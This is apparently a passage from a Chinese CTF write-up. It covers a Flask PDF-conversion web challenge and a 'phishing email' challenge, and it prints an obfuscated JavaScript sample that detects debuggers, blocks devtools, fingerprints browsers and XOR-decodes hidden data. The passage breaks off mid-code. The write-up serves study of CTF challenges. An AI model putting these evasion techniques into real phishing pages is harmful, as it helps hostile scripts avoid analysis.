<span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;directory traversal is not allowed&#x27;</span>, <span class="number">403</span> </span><br><span class="line"></span><br><span class="line">    pdf_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    pdf_content = file.stream.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># just if is a pdf</span></span><br><span class="line">        parser = PDFParser(io.BytesIO(pdf_content))</span><br><span class="line">        doc = PDFDocument(parser)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pdf_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_content)</span><br><span class="line"></span><br><span class="line">    md_filename = os.path.splitext(filename)[<span class="number">0</span>] + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    txt_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pdf_to_text(pdf_path, txt_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> send_file(txt_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_pages</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextContainer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_text</span>(<span class="params">pdf_path, txt_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> page_layout <span class="keyword">in</span> extract_pages(pdf_path):</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> page_layout:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(element, LTTextContainer):</span><br><span class="line">                    txt.write(element.get_text())</span><br><span class="line">                    txt.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>没找到啥参考文章，找<code>ai</code>要了些攻击用例，但都被<strong>过滤</strong>了，要么不起作用</p><p>诶诶诶，原来还是代码审计吗？需要跟进<code>pdfminer包</code>去分析，具体过程看<code>N1</code>和<code>SU</code>战队的<code>wp</code>吧</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="catfriend-172-solved"><a href="#catfriend-172-solved" class="headerlink" title="catfriend | 172 solved"></a>catfriend | 172 solved</h2><p>记事本打开即送(爽赤)</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="phishing-email-38-solved"><a href="#phishing-email-38-solved" class="headerlink" title="phishing email | 38 solved"></a>phishing email | 38 solved</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="title class_">Hidden</span> malicious script <span class="keyword">with</span> multiple layers <span class="keyword">of</span> obfuscation --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">&lt;![<span class="variable constant_">CDATA</span>[</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Anti-debugging and detection evasion</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> jXKuzdDMGk = <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> detectionBypass = <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> globalSeed = <span class="number">0x5A4D</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> entropy = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Advanced fingerprinting and detection evasion</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  (<span class="keyword">function</span> <span class="title function_">antiDetection</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Check for WebDriver, PhantomJS, Burp Suite</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (navigator.<span class="property">webdriver</span> || <span class="variable language_">window</span>.<span class="property">callPhantom</span> || <span class="variable language_">window</span>.<span class="property">_phantom</span> || </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;Burp&quot;</span>) || navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;HeadlessChrome&quot;</span>) ||</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;Selenium&quot;</span>) || <span class="variable language_">window</span>.<span class="property">chrome</span> &amp;&amp; chrome.<span class="property">runtime</span> &amp;&amp; chrome.<span class="property">runtime</span>.<span class="property">onConnect</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;about:blank&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Advanced environment fingerprinting</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ctx.<span class="property">textBaseline</span> = <span class="string">&#x27;top&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ctx.<span class="property">font</span> = <span class="string">&#x27;14px Arial&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ctx.<span class="title function_">fillText</span>(<span class="string">&#x27;Browser fingerprint test&#x27;</span>, <span class="number">2</span>, <span class="number">2</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> fingerprint = canvas.<span class="title function_">toDataURL</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Generate entropy from browser characteristics</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    entropy = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      navigator.<span class="property">hardwareConcurrency</span> || <span class="number">4</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      screen.<span class="property">colorDepth</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      screen.<span class="property">pixelDepth</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTimezoneOffset</span>(),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      fingerprint.<span class="property">length</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      navigator.<span class="property">language</span>.<span class="property">length</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">window</span>.<span class="property">devicePixelRatio</span> * <span class="number">1000</span> | <span class="number">0</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Check for debugging environment indicators</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span> || </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">200</span> ||</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        fingerprint.<span class="property">length</span> &lt; <span class="number">100</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      detectionBypass = <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Generate seed from entropy</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    globalSeed = entropy.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">acc, val</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> ((acc &lt;&lt; <span class="number">5</span>) - acc + val) &amp; <span class="number">0xFFFFFFFF</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;, <span class="number">0x5A4D</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Block developer tools shortcuts</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> blockedKeys = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">keyCode</span>: <span class="number">123</span> &#125;, <span class="comment">// F12</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">85</span> &#125;, <span class="comment">// Ctrl + U</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">73</span> &#125;, <span class="comment">// Ctrl + Shift + I</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">67</span> &#125;, <span class="comment">// Ctrl + Shift + C</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">74</span> &#125;, <span class="comment">// Ctrl + Shift + J</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">75</span> &#125;, <span class="comment">// Ctrl + Shift + K</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">meta</span>: <span class="literal">true</span>, <span class="attr">alt</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">73</span> &#125;, <span class="comment">// Cmd + Alt + I (Mac)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">meta</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">85</span> &#125; <span class="comment">// Cmd + U (Mac)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> isBlocked = blockedKeys.<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> (!key.<span class="property">ctrl</span> || event.<span class="property">ctrlKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             (!key.<span class="property">shift</span> || event.<span class="property">shiftKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             (!key.<span class="property">meta</span> || event.<span class="property">metaKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             (!key.<span class="property">alt</span> || event.<span class="property">altKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             event.<span class="property">keyCode</span> === key.<span class="property">keyCode</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (isBlocked) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      event.<span class="title function_">preventDefault</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Block right-click context menu</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;contextmenu&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    event.<span class="title function_">preventDefault</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Advanced anti-debugging using performance timing with variable thresholds</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  (<span class="keyword">function</span> <span class="title function_">timingCheck</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> baseThreshold = <span class="number">50</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> dynamicThreshold = baseThreshold + (globalSeed % <span class="number">100</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> checkCount = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> start = performance.<span class="title function_">now</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">debugger</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> end = performance.<span class="title function_">now</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      checkCount++;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Variable threshold based on environment</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> currentThreshold = dynamicThreshold + (checkCount * <span class="number">10</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">if</span> (end - start &gt; currentThreshold &amp;&amp; detectionBypass) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        jXKuzdDMGk = <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// Redirect with multiple decoy destinations</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> decoyUrls = [<span class="string">&#x27;https://www.google.com&#x27;</span>, <span class="string">&#x27;https://www.microsoft.com&#x27;</span>, <span class="string">&#x27;about:blank&#x27;</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(decoyUrls[globalSeed % decoyUrls.<span class="property">length</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;, <span class="number">150</span> + (globalSeed % <span class="number">100</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">customPRNG</span>(<span class="params">seed</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> m = <span class="number">0x80000000</span>; <span class="comment">// 2**31</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> a = <span class="number">1103515245</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> c = <span class="number">12345</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    seed = (a * seed + c) % m;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> seed / (m - <span class="number">1</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">advancedXOR</span>(<span class="params">data, keyBase</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> expandedKey = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> keyChar = keyBase.<span class="title function_">charCodeAt</span>(i % keyBase.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> entropyVal = entropy[i % entropy.<span class="property">length</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> rotatedKey = ((keyChar ^ entropyVal) + globalSeed) % <span class="number">256</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      expandedKey += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(rotatedKey);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; data.<span class="property">length</span>; j++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      result += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(data.<span class="title function_">charCodeAt</span>(j) ^ expandedKey.<span class="title function_">charCodeAt</span>(j));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> result;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Main payload - heavily obfuscated with multiple transformation layers</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (!jXKuzdDMGk &amp;&amp; detectionBypass) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decoyArray1 = [<span class="number">119</span>,<span class="number">109</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">125</span>]; <span class="comment">// wmctf&#123;fake_flag&#125;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decoyArray2 = [<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> polymorphicData = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;V01DVEZbZmFrZV9mbGFnXQ==&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;bm90X3RoZV9yZWFsX2ZsYWc=&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;ZGVjb3lfZGF0YQ==&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Layer 3: Environmental validation with complex checks</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> envValidation = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> checks = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">typeof</span> <span class="variable language_">window</span> !== <span class="string">&#x27;undefined&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">typeof</span> <span class="variable language_">document</span> !== <span class="string">&#x27;undefined&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          navigator.<span class="property">userAgent</span>.<span class="property">length</span> &gt; <span class="number">10</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          screen.<span class="property">width</span> &gt; <span class="number">0</span> &amp;&amp; screen.<span class="property">height</span> &gt; <span class="number">0</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title class_">Date</span>.<span class="title function_">now</span>() &gt; <span class="number">1700000000000</span>, <span class="comment">// After 2023</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title class_">Math</span>.<span class="title function_">abs</span>(<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTimezoneOffset</span>()) &lt; <span class="number">1440</span>, <span class="comment">// Valid timezone</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          entropy.<span class="property">length</span> === <span class="number">7</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          globalSeed !== <span class="number">0x5A4D</span> <span class="comment">// Should be modified by fingerprinting</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> validCount = checks.<span class="title function_">filter</span>(<span class="title class_">Boolean</span>).<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> validCount &gt;= <span class="number">6</span>; <span class="comment">// Require most checks to pass</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Layer 4: Steganographic data hidden in mathematical sequences</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> fibSequence = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">89</span>,<span class="number">144</span>,<span class="number">233</span>,<span class="number">377</span>,<span class="number">610</span>,<span class="number">987</span>,<span class="number">1597</span>,<span class="number">2584</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> primeSequence = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Hidden data in sequence differences (steganography)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> hiddenIndices = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; fibSequence.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> diff = fibSequence[i] - fibSequence[i-<span class="number">1</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (diff &gt; <span class="number">0</span> &amp;&amp; diff &lt; polymorphicData.<span class="property">length</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          hiddenIndices.<span class="title function_">push</span>(diff % 